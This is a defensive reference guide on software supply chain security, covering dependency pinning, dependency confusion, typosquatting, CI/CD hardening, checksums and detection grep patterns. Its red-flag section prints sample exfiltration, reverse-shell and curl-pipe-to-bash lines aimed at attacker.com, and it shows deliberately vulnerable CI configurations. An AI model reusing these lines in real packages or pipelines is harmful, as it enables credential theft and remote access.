# Supply Chain Security Reference

## Overview

Supply chain vulnerabilities occur when attackers compromise dependencies, build systems, or distribution mechanisms. This includes vulnerable dependencies, dependency confusion attacks, compromised build pipelines, and malicious packages.

---

## Vulnerable Dependencies

### Detection Patterns

```bash
# Check for known vulnerabilities
npm audit
pip-audit
cargo audit
bundle audit
safety check

# Check for outdated packages
npm outdated
pip list --outdated
```

### Lock Files

```python
# VULNERABLE: No lock file - versions float
# requirements.txt
requests>=2.0

# SAFE: Pinned versions with lock file
# requirements.txt
requests==2.28.1

# Or using pip-tools
# requirements.in -> requirements.txt (generated, pinned)
```

### Patterns to Flag

```json
// VULNERABLE: No lock file committed
// Missing: package-lock.json, yarn.lock, Pipfile.lock, Cargo.lock, go.sum

// VULNERABLE: Lock file in .gitignore
// .gitignore
package-lock.json
yarn.lock

// VULNERABLE: Version ranges that could change
// package.json
{
  "dependencies": {
    "lodash": "^4.0.0",    // Could get 4.999.0
    "express": "*",         // Any version
    "axios": "latest"       // Always latest
  }
}
```

---

## Dependency Confusion

### Attack Vector

Attackers publish malicious packages with the same name as internal packages to public registries. When build systems check public registries first, they may install the malicious version.

### Vulnerable Configurations

```python
# VULNERABLE: pip checks PyPI before internal registry
# pip.conf with both sources but no priority
[global]
index-url = https://pypi.org/simple
extra-index-url = https://internal.company.com/pypi

# VULNERABLE: npm checks public registry
# .npmrc
registry=https://registry.npmjs.org
@company:registry=https://npm.company.com
# Public package "company-utils" could shadow internal one
```

### Mitigations

```ini
# SAFE: Internal registry only for scoped packages
# .npmrc
@company:registry=https://npm.company.com
//npm.company.com/:_authToken=${NPM_TOKEN}

# SAFE: pip with explicit index for each package
# requirements.txt with --index-url per package
--index-url https://internal.company.com/pypi
internal-package==1.0.0
--index-url https://pypi.org/simple
requests==2.28.1
```

```json
// SAFE: npm package name claiming (publish placeholder to public)
// Publish empty package to npmjs.org with same name as internal packages
{
  "name": "internal-company-package",
  "version": "0.0.0",
  "description": "This package name is reserved"
}
```

---

## Typosquatting

### Detection

```python
# VULNERABLE: Misspelled package names
# requirements.txt
reqeusts==2.28.0    # Typo of 'requests'
djando==4.0.0       # Typo of 'django'
python-nmap         # Could be confused with nmap

# package.json
"lodahs": "4.0.0"   # Typo of 'lodash'
"electorn": "1.0.0" # Typo of 'electron'
```

### Common Typosquatting Patterns

- Character omission: `requests` → `reqests`
- Character swap: `django` → `djagno`
- Character doubling: `numpy` → `numppy`
- Homoglyphs: `requests` → `rеquests` (Cyrillic е)
- Adding suffixes: `requests-dev`, `requests-py`

---

## Build Pipeline Security

### Insecure CI/CD Patterns

```yaml
# VULNERABLE: Secrets in plain text
# .github/workflows/build.yml
env:
  AWS_SECRET_KEY: AKIAIOSFODNN7EXAMPLE

# VULNERABLE: Running arbitrary code from PRs
on:
  pull_request_target:
    types: [opened]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3
        with:
          ref: ${{ github.event.pull_request.head.sha }}  # Runs untrusted code
      - run: npm install && npm test

# VULNERABLE: Using unpinned actions
steps:
  - uses: actions/checkout@main  # Could change maliciously
  - uses: some-action@latest
```

### Secure CI/CD Configuration

```yaml
# SAFE: Pinned action versions with hash
steps:
  - uses: actions/checkout@8e5e7e5ab8b370d6c329ec480221332ada57f0ab  # v3.5.2

# SAFE: Secrets from secure storage
env:
  AWS_SECRET_KEY: ${{ secrets.AWS_SECRET_KEY }}

# SAFE: Separate workflow for untrusted PRs
on:
  pull_request:  # Not pull_request_target
jobs:
  build:
    runs-on: ubuntu-latest
    permissions:
      contents: read  # Minimal permissions
```

---

## Package Integrity

### Verify Checksums

```bash
# SAFE: Verify package checksums
pip install --require-hashes -r requirements.txt

# requirements.txt with hashes
requests==2.28.1 \
    --hash=sha256:7c5599b102feddaa661c826c56ab4fee28bfd17f5abca1ebbe3e7f19d7c97983

# npm with integrity
npm ci  # Uses package-lock.json with integrity hashes
```

### Signature Verification

```bash
# Verify GPG signatures
gpg --verify package.tar.gz.sig package.tar.gz

# Go module checksums
# go.sum contains cryptographic checksums
go mod verify
```

---

## Malicious Package Indicators

### Suspicious Patterns in Packages

```python
# RED FLAGS in package code:

# Network calls during install
# setup.py
import requests
requests.post('https://attacker.com/data', data=os.environ)

# Obfuscated code
exec(base64.b64decode('aW1wb3J0IG9z...'))
eval(compile(base64.b64decode(code), '<string>', 'exec'))

# Environment variable exfiltration
os.environ.get('AWS_SECRET_ACCESS_KEY')
subprocess.run(['env'])

# Reverse shells
socket.socket().connect(('attacker.com', 4444))
os.system('bash -i >& /dev/tcp/attacker.com/4444 0>&1')

# Cryptocurrency miners
import hashlib
while True:
    hashlib.sha256(data).hexdigest()
```

### Pre/Post Install Scripts

```json
// package.json - check these scripts carefully
{
  "scripts": {
    "preinstall": "curl https://attacker.com/script.sh | bash",  // DANGEROUS
    "postinstall": "node ./malicious.js",  // CHECK THIS
    "prepare": "..."
  }
}
```

```python
# setup.py - check for code execution during install
from setuptools import setup
from setuptools.command.install import install

class PostInstall(install):
    def run(self):
        install.run(self)
        # CHECK WHAT RUNS HERE
        os.system('whoami')  # DANGEROUS

setup(
    cmdclass={'install': PostInstall}
)
```

---

## Private Registry Security

### Misconfiguration

```yaml
# VULNERABLE: Registry credentials in code
# .npmrc committed to repo
//registry.npmjs.org/:_authToken=npm_XXXX

# VULNERABLE: Unauthenticated internal registry
registry=http://internal-npm.company.com  # No auth, HTTP

# VULNERABLE: Pull from any registry
pip install package  # Will check PyPI even for internal names
```

### Secure Configuration

```yaml
# SAFE: Credentials from environment
# .npmrc
//registry.npmjs.org/:_authToken=${NPM_TOKEN}

# SAFE: Scoped to specific registries
@company:registry=https://npm.company.com
//npm.company.com/:_authToken=${INTERNAL_NPM_TOKEN}

# SAFE: Internal registry only mode for sensitive builds
# pip.conf
[global]
index-url = https://internal.company.com/pypi
# No extra-index-url to public registries
```

---

## Vendoring Dependencies

### When to Vendor

```bash
# Consider vendoring for:
# - Critical security applications
# - Air-gapped environments
# - Reproducible builds

# Go vendoring
go mod vendor
# Commit vendor/ directory

# Python vendoring
pip download -r requirements.txt -d ./vendor/
# Install from local: pip install --no-index --find-links=./vendor/ -r requirements.txt
```

---

## SBOM (Software Bill of Materials)

### Generation

```bash
# Generate SBOM for vulnerability tracking
# CycloneDX format
cyclonedx-py --format json -o sbom.json

# SPDX format
syft . -o spdx-json > sbom.spdx.json

# npm
npm sbom --sbom-format cyclonedx
```

---

## Grep Patterns for Detection

```bash
# Unpinned dependencies
grep -rn "\*\|latest\|>=\|~\|^" package.json requirements.txt

# Missing lock files
ls package-lock.json yarn.lock Pipfile.lock Cargo.lock go.sum 2>/dev/null

# Credentials in config
grep -rn "_authToken\|registry.*token\|password" .npmrc .pypirc pip.conf

# Suspicious install scripts
grep -rn "preinstall\|postinstall\|prepare" package.json

# Obfuscated code in dependencies
grep -rn "eval(.*base64\|exec(.*decode\|compile(.*decode" node_modules/ site-packages/

# Network calls in setup.py
grep -rn "requests\|urllib\|socket" setup.py

# Unpinned GitHub Actions
grep -rn "uses:.*@main\|uses:.*@master\|uses:.*@latest" .github/workflows/
```

---

## Testing Checklist

- [ ] All dependencies pinned to exact versions
- [ ] Lock files committed and not in .gitignore
- [ ] Dependencies scanned for known vulnerabilities
- [ ] Internal packages use scoped names or claimed on public registries
- [ ] CI/CD actions pinned to commit hashes
- [ ] Secrets not hardcoded in CI/CD configs
- [ ] Package integrity verified (checksums/signatures)
- [ ] Pre/post install scripts reviewed
- [ ] Private registry credentials not in code
- [ ] SBOM generated for production dependencies

---

## References

- [OWASP Dependency Check](https://owasp.org/www-project-dependency-check/)
- [SLSA Framework](https://slsa.dev/)
- [CWE-1104: Use of Unmaintained Third Party Components](https://cwe.mitre.org/data/definitions/1104.html)
- [Dependency Confusion Attack](https://medium.com/@alex.birsan/dependency-confusion-4a5d60fec610)
